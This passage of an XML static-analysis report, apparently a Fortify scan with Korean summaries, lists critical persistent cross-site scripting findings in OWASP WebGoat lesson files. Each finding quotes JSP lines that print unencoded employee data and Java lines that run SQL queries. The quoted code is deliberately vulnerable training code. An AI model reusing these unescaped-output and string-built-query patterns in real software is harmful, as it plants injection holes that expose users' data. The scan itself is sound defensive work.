                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="90943360D9C71A6985886DE8972E353C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="47075B919F60B20E159C5FD7316FC0D9" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;span class="lesson_text_db"&gt;&lt;%=employee.getLastName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8680CD7D00BFBF365F43BD20325374C7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 95 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>95</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FBDFC9075FCCE8243BE8344C6AA6F01C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CA5A03C23B1C44AACA85187C9981B289" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 40 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>40</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="79BB2EE7720EC9B7B7F71A1B0729872C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 91 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>91</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="60B5252EDB5A7AF391378D9A55568D48" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B9C957E5E8357BF5C37B404094B8F6FB" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 53 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B78394A78DB8EF3256F7309C40F97D97" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A78D3EC18A29D40747416C9C74ECFE73" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="58EBE9823C8CAE33E2DA0AA5B6148A31" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CA030D6C90F09982DCFCD4A5F9DF3DE3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BEB6A6EBEC0C72F0E896E727691CCD39" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="561D5C67D9FE2523106C5C32E17F57E7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress1()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D2E4AB4D1DCA1CA3C50AB07FAFE8A515" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;span class="lesson_text_db"&gt;&lt;%=employee.getSsn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D427FC9502C03F11D99CEED835F5070E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AF8BA3171745CC5B90151A8BACBE639A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;span class="lesson_text_db"&gt;&lt;%=employee.getSsn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AAFC1F7059CAAA46A9CD6BDBA80E9307" ruleID="94B3FB0E-4AED-4006-9CDD-B2B1C13747EE">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>CSRF.java의 makeCurrent() 메서드가 248 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>248</LineStart>
<Snippet>				Table t = new Table( 0 ).setCellSpacing( 0 ).setCellPadding( 0 ).setBorder( 0 );
				TR row1 = new TR( new TD( new B(new StringElement( "Title:" )) ) );
				row1.addElement( new TD( new StringElement( results.getString( TITLE_COL ) ) ) );
				t.addElement( row1 );
</Snippet>
<TargetFunction>org.apache.ecs.html.TD.TD()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>241</LineStart>
<Snippet>			statement.setString(1, getNameroot( s.getUserName() ) + "%");
			statement.setInt(2, messageNum);
			ResultSet results = statement.executeQuery();

			if ( ( results != null ) &amp;&amp; results.first() )</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B916F93927B55477C6A96340B56EA5A4" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						&lt;!-- STAGE 4 - FIX  Note that the description value below gets encoded and address1 here is not --&gt;

						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1D08BFF1784797C39099A067A09CDDC3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 110 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>110</LineStart>
